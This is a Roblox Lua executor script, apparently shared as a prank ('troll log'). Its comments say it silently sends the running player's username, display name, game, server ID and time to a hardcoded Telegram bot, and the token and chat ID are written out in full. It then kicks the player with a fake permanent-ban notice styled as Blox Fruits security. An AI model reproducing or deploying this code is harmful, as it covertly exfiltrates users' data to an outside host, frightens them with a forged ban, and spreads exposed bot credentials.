--[[
    ╔══════════════════════════════════════════════════════════╗
    ║               REYZIM SCRIPTS - TROLL LOG V4.2            ║
    ║        LOG SILENCIOSO + BAN PROFISSIONAL (TROLL)         ║
    ║        CRIADO POR: REYZIM | TIKTOK: @REYZIM_DZ           ║
    ╚══════════════════════════════════════════════════════════╝
]]

local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local MarketplaceService = game:GetService("MarketplaceService")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer

-- [ CONFIGURAÇÕES DO TELEGRAM ]
local TOKEN = "8500284543:AAGzMLvtIBmRVPzgMYEo9tdqd2GHoW6TUPI"
local CHAT_ID = "8766981973"

-- Detecta a função de request do executor
local requestFunc = (syn and syn.request) or (http and http.request) or request or http_request

local function urlEncode(str)
    str = string.gsub(str, "\n", "\r\n")
    str = string.gsub(str, "([^%w %-%_%.%~])", function(c)
        return string.format("%%%02X", string.byte(c))
    end)
    str = string.gsub(str, " ", "%%20")
    return str
end

local function enviarLogTelegram()
    task.spawn(function()
        local gameName = "Desconhecido"
        pcall(function()
            gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
        end)
        
        local time = os.date("%d/%m/%Y - %H:%M:%S")
        local device = "Mobile (Delta)"
        local jobId = game.JobId or "N/A"
        
        local mensagem = "🚀 *NOVA EXECUÇÃO - REYZIM SCRIPTS*\n\n" ..
                         "👤 *Usuário:* " .. LocalPlayer.Name .. " (" .. LocalPlayer.DisplayName .. ")\n" ..
                         "⏰ *Horário:* " .. time .. "\n" ..
                         "📱 *Celular Info:* " .. device .. "\n" ..
                         "🎮 *Game:* " .. gameName .. "\n" ..
                         "🆔 *Server ID:* `" .. jobId .. "`"

        local url = "https://api.telegram.org/bot" .. TOKEN .. "/sendMessage?chat_id=" .. CHAT_ID .. "&text=" .. urlEncode(mensagem) .. "&parse_mode=Markdown"
        
        if requestFunc then
            pcall(function()
                requestFunc({Url = url, Method = "GET"})
            end)
        else
            pcall(function()
                game:HttpGet(url)
            end)
        end
    end)
end

-- 1. Envia o log primeiro (Silenciosamente)
enviarLogTelegram()

-- 2. Espera 6 segundos para a pegadinha
task.wait(6)

-- 3. A PEGADINHA: Mensagem de Banimento Ultra Profissional (Estilo Blox Fruits)
local mensagemBan = "\n[Blox Fruits - Security System]\n\n" ..
                    "Sua conta foi suspensa permanentemente por violar os Termos de Serviço.\n" ..
                    "Motivo: Exploração e uso de softwares de terceiros (Third-Party Software).\n" ..
                    "Data da Punição: " .. os.date("%d/%m/%Y") .. "\n" ..
                    "ID do Banimento: #BF-" .. math.random(100000, 999999) .. "\n\n" ..
                    "Esta suspensão é permanente e não pode ser contestada no momento. Visite o nosso servidor oficial para mais informações."

LocalPlayer:Kick(mensagemBan)
